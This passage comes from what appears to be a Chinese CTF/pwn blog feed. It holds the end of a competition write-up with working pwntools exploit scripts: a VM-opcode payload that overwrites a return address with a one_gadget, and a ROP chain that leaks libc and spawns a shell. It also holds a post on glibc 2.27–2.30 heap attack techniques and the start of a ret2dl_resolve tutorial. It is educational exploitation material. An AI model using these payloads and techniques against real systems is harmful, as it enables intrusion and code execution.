把相对于bp为offset的地址赋值给寄存器</p><p>指令1：p64(1)+p64(num)   把num赋值给寄存器</p><h4 id="给pop出的地址赋值"><a href="#给pop出的地址赋值" class="headerlink" title="给pop出的地址赋值"></a>给pop出的地址赋值</h4><p><img src="/2020/05/11/wdb-wp/image-20200511103502751.png" alt="image-20200511103502751"></p><p>直接p64(11)就是把pop出的一个地址，将寄存器的值赋值给pop出地址中的内容。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>有了这些东西，思路就很简单了，找到_environ的值，计算出EIP的值，更换成one_gadget。</p><h3 id="exp-主体"><a href="#exp-主体" class="headerlink" title="exp 主体"></a>exp 主体</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">one = <span class="number">0xf1147</span></span><br><span class="line">ru(<span class="string">"Input your code&gt; "</span>)</span><br><span class="line">payload = p64(<span class="number">1</span>)+p64(<span class="number">18446744073709551376</span>)<span class="comment">#tmp=-0xf0</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment">#push -0xf0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">18446744073709271013</span>)<span class="comment">#0x7f96e2df6010 get _environ address</span></span><br><span class="line">payload += p64(<span class="number">9</span>) <span class="comment">#get _environ</span></span><br><span class="line">payload += p64(<span class="number">25</span>) <span class="comment">#_environ-0xf0(EIP)</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment">#push EIP</span></span><br><span class="line">payload += p64(<span class="number">1</span>)+p64(one)<span class="comment">#tmp= onegadget offset</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment">#push tmp</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">18446744073708775934</span>)<span class="comment">#libc_start</span></span><br><span class="line">payload += p64(<span class="number">25</span>) <span class="comment">#tmp = libc_start+tmp</span></span><br><span class="line">payload += p64(<span class="number">11</span>) <span class="comment">#edit EIP</span></span><br><span class="line">debug()</span><br><span class="line">s(payload)</span><br><span class="line">getshell()</span><br></pre></td></tr></table></figure><p>最后：</p><p><img src="/2020/05/11/wdb-wp/image-20200511103849331.png" alt="image-20200511103849331"></p><h2 id="faster0"><a href="#faster0" class="headerlink" title="faster0"></a>faster0</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>这个题目就是很多个路径，而且有回路，angr直接去跑是不可以的，这道题由于比较简单，所以使用angr就有点杀鸡牛刀的感觉了，直接objdump出某个函数，然后分析这个函数的分支就可以了，用disasm也是可以的，最后就是一个栈溢出了，这里我就把前面寻找路径的exp贴出来，最后的栈溢出，过于基础，就不提了。</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>首先给出一个objdump 某个函数的脚本，我们主要利用这个脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">vmlinux=<span class="variable">$1</span></span><br><span class="line">symbol=<span class="variable">$2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$vmlinux</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"usage : <span class="variable">$0</span> vmlinux symbol"</span></span><br><span class="line">                    <span class="built_in">exit</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">                startaddress=$(nm -n <span class="variable">$vmlinux</span> | grep <span class="string">"\w\s<span class="variable">$symbol</span>"</span> | awk <span class="string">'&#123;print "0x"$1;exit&#125;'</span>)</span><br><span class="line">                endaddress=$(nm -n <span class="variable">$vmlinux</span> | grep -A1 <span class="string">"\w\s<span class="variable">$symbol</span>"</span> | awk <span class="string">'&#123;getline; print "0x"$1;exit&#125;'</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$symbol</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">"dump all symbol"</span></span><br><span class="line">                                    objdump -d <span class="variable">$vmlinux</span></span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                            <span class="built_in">echo</span> <span class="string">"start-address: <span class="variable">$startaddress</span>, end-address: <span class="variable">$endaddress</span>"</span></span><br><span class="line">                                                    objdump -d <span class="variable">$vmlinux</span> --start-address=<span class="variable">$startaddress</span> --stop-address=<span class="variable">$endaddress</span></span><br><span class="line">                                                <span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>最后解析的过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">num=<span class="number">0</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span>(max!=<span class="number">100</span>):</span><br><span class="line">    fun_name = <span class="string">"func"</span>+str(max).rjust(<span class="number">3</span>,<span class="string">"0"</span>)</span><br><span class="line">    os.system(<span class="string">"./objdump_function.sh "</span>+elf_name+<span class="string">" "</span>+fun_name+<span class="string">" &gt; "</span>+fun_name)</span><br><span class="line">    fun_content = open(fun_name,<span class="string">"r"</span>).read()</span><br><span class="line">    fun_content = fun_content.split(<span class="string">'\n'</span>)</span><br><span class="line">    max_address = <span class="number">0</span></span><br><span class="line">    list =<span class="number">0</span></span><br><span class="line">    num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fun_content:</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"callq"</span> <span class="keyword">in</span> i) <span class="keyword">and</span>(<span class="string">"func"</span> <span class="keyword">in</span> i):</span><br><span class="line">            tmp = i.split(<span class="string">" &lt;func"</span>)</span><br><span class="line">            a = tmp[<span class="number">1</span>].split(<span class="string">"&gt;"</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> int(a)==num:</span><br><span class="line">                num =int(a)</span><br><span class="line">                <span class="comment">#max_address = int("0x"+tmp[0].split("callq  ")[1],16)</span></span><br><span class="line">                max_list = list</span><br><span class="line">            list +=<span class="number">1</span></span><br><span class="line">    print(max_list)</span><br><span class="line">    result+=str(max_list)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>得到如下解析结果：</p><p><img src="/2020/05/11/wdb-wp/image-20200511104510265.png" alt="image-20200511104510265"></p><p>最后由exp输入给程序得到：</p><p><img src="/2020/05/11/wdb-wp/image-20200511104533332.png" alt="image-20200511104533332"></p><p>最后就是一个简单的栈溢出，直接用ROP就OK了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = process(elf_name)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    p.send(i)</span><br><span class="line">p.send(<span class="string">"\n"</span>)</span><br><span class="line">pop_rsi_p = <span class="number">0x406011</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000406013</span></span><br><span class="line">pppp = <span class="number">0x000000000040600c</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0xd8</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_p)+p64(<span class="number">0x609020</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x40063C</span>)+p64(pop_rdi)+p64(<span class="number">0x609018</span>)+p64(pop_rsi_p)+p64(<span class="number">0x16</span>)+p64(<span class="number">0x8</span>)+p64(<span class="number">0x4007A7</span>)+p64(pppp)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x40063C</span>)</span><br><span class="line">p.recvuntil(<span class="string">"WOW,U R GREAT !\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x884d0</span></span><br><span class="line">system_address=address +<span class="number">0xe569f</span></span><br><span class="line">p.send(p64(system_address))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最后得到：</p><p><img src="/2020/05/11/wdb-wp/image-20200511140637941.png" alt="image-20200511140637941"></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如有错误欢迎指正：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> libc </tag>
            
            <tag> baby_aeg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc中堆管理的变化</title>
      <link href="/2020/05/10/libc230/"/>
      <url>/2020/05/10/libc230/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学pwn的道路上，我们大多从linux入手，从栈到堆，各种漏洞利用，都和Glibc或多或少打过交道。我的堆入门应该和很多人一样是从libc2.23开始的，之后又经历了各种libc版本的变化，随着现在的pwn题越来越与时俱进，我们会逐渐接触更新的libc版本，因此，我们必须知道，Glibc中堆管理变化了什么，从安全角度，我们的得失又是什么呢？从libc2.27开始，我们聊一聊Glibc中堆管理的漏洞利用得失。</p><p>关键字： <code>CTF</code> <code>pwn</code> <code>新版本libc</code> <code>libc 2.27</code> <code>libc 2.29</code> <code>libc 2.30</code>  <code>堆溢出</code></p><a id="more"></a><h2 id="GLibc2-27"><a href="#GLibc2-27" class="headerlink" title="GLibc2.27"></a>GLibc2.27</h2><p>Glibc2.23我就不想多说了，感兴趣的朋友可以学一学pwn相关的堆漏洞利用知识，网上现在总结的也算是比较多。我就不赘述了。从Glibc2.27开始，发生了很多有趣的地方，我们一起聊一聊。</p><h3 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h3><p>Tcache可是说是Glibc2.27中一个大的改变，其实Tcache的引入是从Glibc2.26开始的。但是（以下个人见解）Linux中比较受欢迎的发行版，ubuntu 18.04中的libc版本是2.27，再加上很多发行版都是2.27版本，所以，我们常见的pwn题也就在这种环境下编译开发了，因此，我们直接说说2.27版本，跳过2.26版本。</p><p>我认为Tcache使得漏洞利用变简单了，其得失我总结了一下：</p><ul><li>漏洞利用最后一哆嗦，特别简单暴力</li><li>Tcache的管理结构在堆上，比main_arena好搞一点，毕竟Libc地址一般比堆地址难搞到</li><li>Tcache有时候使得泄露Libc地址变得困难</li></ul><p>这里我说下Tcache的机制，tcache就是一个为了内存分配速度而存在的机制，当size不大（这个程度后面讲）堆块free后，不会直接进入各种bin，而是进入tcache，如果下次需要该大小内存，直接讲tcache分配出去，是不是感觉和fastbin蛮像的，但是其size的范围比fastbin大多了，他有64个bin链数组，也就是<code>(64+1)*size_sz*2</code>，在64位系统中就是0x410大小，有图有真相：</p><p><img src="/2020/05/10/libc230/image-20200402092336545.png" alt="image-20200402092336545"></p><p><img src="/2020/05/10/libc230/image-20200403102925003.png" alt="image-20200403102925003"></p><p>也就是说，在64位情况下，tcache可以接受0x20~0x410大小的堆块。</p><h3 id="Tcache-poisoning"><a href="#Tcache-poisoning" class="headerlink" title="Tcache poisoning"></a>Tcache poisoning</h3><p>那么Tcache对漏洞利用来说，不像fastbin attack一样，需要寻找合适的size了，<strong>在2.27的环境下是可以直接做到任意地址写的</strong>，这一点非常nice, 这种利用方法，在也被叫做<strong>tcache poisoning</strong>。同时，在double free领域，Tcache可以直接double free，而不需要像fastbin那样，需要和链上上一个堆块不一样,也就是下面这个样子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">heap0 ----&gt; heap1 ----&gt; heap0 (fastbin YES)</span></span><br><span class="line"><span class="comment">heap0 ----&gt; heap0 (fastbin NO)</span></span><br><span class="line"><span class="comment">heap0 ----&gt; heap0 (Tcahce YES)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>还有一点不同，就是在Tcache中，<strong>fd指向的并不是堆头，而是堆内容</strong>，这一点也是需要我们注意的。</p><p><img src="/2020/05/10/libc230/image-20200417093525457.png" alt="image-20200417093525457"></p><h4 id="leak-libc地址"><a href="#leak-libc地址" class="headerlink" title="leak libc地址"></a>leak libc地址</h4><p>单纯在堆中leak libc地址，一般是使用size大于fastbin范围的堆块，而在有tcache的情况下，这个变得相较之前困难，我将我目前用的比较多的方法总结如下：</p><p>1、申请8个大堆块，释放8个，这里堆块大小，大于fastbin范围，就是填满tcache，<strong>注意和top chunk的位置</strong>。</p><p><img src="/2020/05/10/libc230/image-20200417094034894.png" alt="image-20200417094034894"></p><p>2、有double free的情况下，连续free 8次同一个堆块，这里堆块大小，大于fastbin范围，<strong>注意和top chunk的位置</strong>。</p><p><img src="/2020/05/10/libc230/image-20200417094232028.png" alt="image-20200417094232028"></p><p>3、申请大堆块，大于0x410。</p><p><img src="/2020/05/10/libc230/image-20200417094321487.png" alt="image-20200417094321487"></p><p>4、修改堆上的Tcache管理结构</p><p><img src="/2020/05/10/libc230/image-20200417104518985.png" alt="image-20200417104518985"></p><p>大致就是以上几种方法，如果还有其他的想法，欢迎交流。</p><h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><p>网上有很多人在分析这一漏洞的时候，都是基于libc2.29分析的，其实在libc2.27中，这一漏洞就已经存在了。</p><p>这里简单讲下，这是small bin 中的检查，即：__glibc_unlikely(bck-&gt;fd != victim)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line">             <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">             <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                 errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">             set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">             <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>我们来看看Tcache中的情况：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;<span class="comment">//0</span></span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);<span class="comment">//1</span></span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>那么，我们需要注意2个地方，就是我在源码中标注的0和1。那么这两个地方由于没有任何检查，导致了两个问题，1、任意地址写libc地址，2、将任意地址放入tcache。</p><p>那么这段的逻辑是什么呢，简单来说，当我们从smallbin中申请了一个chunk后，会将此大小的tcache用smallbin里的堆块填满。</p><p>我们来看看什么时候，终止填入呢，两个条件：<code>tcache-&gt;counts[tc_idx] &gt;= mp_.tcache_count || (tc_victim = last (bin)) == bin</code>就是上述while循环中的相反的条件。也就是说，如果smallbin里没heap了或者tcache填满了，就不需要继续填充了，但是由于我们期望漏洞利用，所以需要改掉bck，这就导致<code>(tc_victim = last (bin)) == bin</code>这个条件是很难达到的。所以，我们需要控制tcache中的数量，但是，这里又出现了一个矛盾，那就是如果Tcache不为空，就不会从smallbin中取出堆块。</p><p>所以，综上所述，只有绕过tcache的calloc能够符合这样的要求，那么，如果，我们想要任意地址写libc，就在tcache中留一个空间，如果期望任意地址放入tcache，就在tcache中留两个空间，同时，我们需要清楚，动手脚的small bin 应该是倒数第二个smallbin。</p><p>画个图示意一下：</p><p><img src="/2020/05/10/libc230/image-20200417174613423.png" alt="image-20200417174613423"></p><p>将Chunk1的bk指向目标地址，再calloc一个0xa0大小的chunk，参照上述的目的，确定自己需要在Tcache中留几个heap。</p><h3 id="Tcache结构破坏"><a href="#Tcache结构破坏" class="headerlink" title="Tcache结构破坏"></a>Tcache结构破坏</h3><p>这个其实没什么好说的，只是一个tips吧，tcache的管理结构在堆上，再加上tcache宽松的检查条件，其实有时候搞一搞这里还是蛮有意思的。</p><p>libc2.27中的东西基本就讲这些了，接下来就是libc2.29了</p><h2 id="Glibc2-29"><a href="#Glibc2-29" class="headerlink" title="Glibc2.29"></a>Glibc2.29</h2><p>在2.27的基础上，我们看看2.29做了哪些改变：</p><h3 id="Tcache的double-free防护"><a href="#Tcache的double-free防护" class="headerlink" title="Tcache的double free防护"></a>Tcache的double free防护</h3><p>首先是一个对漏洞利用者较为遗憾的改动，就是在tcache的结构体上，加了一个key。</p><p><img src="/2020/05/10/libc230/image-20200417175320939.png" alt="image-20200417175320939"></p><p><img src="/2020/05/10/libc230/image-20200417175337817.png" alt="image-20200417175337817"></p><p>在官方注释上，这一增加是为了检测tcache的double free，在2.27的libc中，tcache为了速度，几乎没有什么安全保护，这一机制会缓解部分漏洞利用。<br>那么，这一增加如何作用呢，我们可以看到，在tcache_put中，对这一结构体进行了赋值，赋值的内容就是定义的tcache_perthread_struct结构体tcache的地址，tcache就是通过这一函数来判断当前的heap是否在tcache中，当然，在tcache_get中，也会将其清理。同时在free中加了这么一段。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don't abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>也就是说在free时，如果当前的chunk的bk位置是tcache这一地址，那么就会循环检测当前大小的tcache的链表，查看链表中是否存在当前的chunk。所以，想要double free前，记得先改一下bk。</p><h3 id="unlink前操作"><a href="#unlink前操作" class="headerlink" title="unlink前操作"></a>unlink前操作</h3><p>在free的时候，unlink前新加了一个检查，这个不太致命，注意绕过即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      <span class="built_in">size</span> += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<span class="comment">//add</span></span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);<span class="comment">//add</span></span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="unsortbin保护"><a href="#unsortbin保护" class="headerlink" title="unsortbin保护"></a>unsortbin保护</h3><p>不说了，unsortbin attack我先不用了，总可以了吧（含泪）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">          || __glibc_unlikely (<span class="built_in">size</span> &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): invalid size (unsorted)"</span>);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">          || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): invalid next size (unsorted)"</span>);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != <span class="built_in">size</span>))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): mismatching next-&gt;prev_size (unsorted)"</span>);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">          || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): unsorted double linked list corrupted"</span>);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): invalid next-&gt;prev_inuse (unsorted)"</span>);</span><br><span class="line">...... ......</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">      unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><h2 id="libc-2-30"><a href="#libc-2-30" class="headerlink" title="libc 2.30"></a>libc 2.30</h2><p>那么到了libc2.30其实增加的东西也是不多了。</p><h3 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h3><p>在largebin 中，加了这个，刚好对largbin的bk和bk_nextsize做出了限制。</p><p><img src="/2020/05/10/libc230/image-20200417181909176.png" alt="image-20200417181909176"></p><p>那么在插入large bin时，就不能使用large bin Attack了（关于Largebin Attack的方法，可参照我之前文章<a href="http://pwn.sofr.website/2020/04/02/LargebinAttack/）" target="_blank" rel="noopener">http://pwn.sofr.website/2020/04/02/LargebinAttack/）</a></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>文章首发于freebuf</p><p>如有错误欢迎指正：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2dl_resolve</title>
      <link href="/2020/05/09/re2dl_resolve/"/>
      <url>/2020/05/09/re2dl_resolve/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ret2dl_resolve是linux下一种利用linux系统延时绑定(Lazy Binding)机制的一种漏洞利用方法，其主要思想是利用_dl_runtime_resolve()函数写GOT表的操作，改写写入GOT的内容，使其成为getshell的函数值</p><p>关键字： <code>CTF</code> <code>pwn</code> <code>ret2dl_resolve</code> <code>ret2_dl_runtime_resolve</code> <code>延时绑定</code> <code>栈溢出</code> <code>ROP</code></p><a id="more"></a><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>在了解利用方法之前必须对延时绑定机制详细了解。其具体的方法可以参照《程序员的自我修养——链接、装载与库》一书7.4节。</p><p>为了实现少量时间换取大量空间以及方便程序维护的目的，Linux中大量程序抛弃了静态链接的方式，转而投向动态链接 的怀抱。但是由于在程序在运行中不需要动态共享库(.so文件)中的所有函数，所以很多函数自始至终是没有被使用过的。如果一股脑将动态共享库中所有函数都装载进程序的运行空间，这是十分消耗资源的。于是为了节省资源，Linux在程序第一次调用函数时才会将其装载程序。</p><p>这里用到了PLT表的结构，细心的小伙伴可能注意过，PLT表中每个函数的第一项都是一个jmp至GOT表的操作。那么这个PLT的作用又是什么呢，为什么不直接使用GOT表呢。在jmp指令下面，还有push和另一个jmp指令，这些指令又是为什么存在在这里呢。</p><p>首先看图，此程序是运行在linux下的32位程序，此时的程序的状态是刚刚进入main函数，还未对write函数进行调用：</p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-193621_635x89_scrot.png" alt="2019-07-04-193621_635x89_scrot"></p><p>这便是一个程序中PLT表write函数对应表项的内容。此时第一条指令跳转的目的地便是GOT表中write函数对应的表项，查看这个地址中的内容：</p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-194134_429x42_scrot.png" alt="2019-07-04-194134_429x42_scrot"></p><p>可以看到，实际上GOT表中在一开始时，并没有存放函数的真实地址，而是原来PLT表write函数对应表项中push 0x20指令的位置，也就是说，当函数第一次调用write函数时，实际上并未直接到底libc中write函数的真正地址，而是绕了一圈回到了PLT表中，将0x20压入栈中，之后跳转至0x8048380处。</p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-194619_514x62_scrot.png" 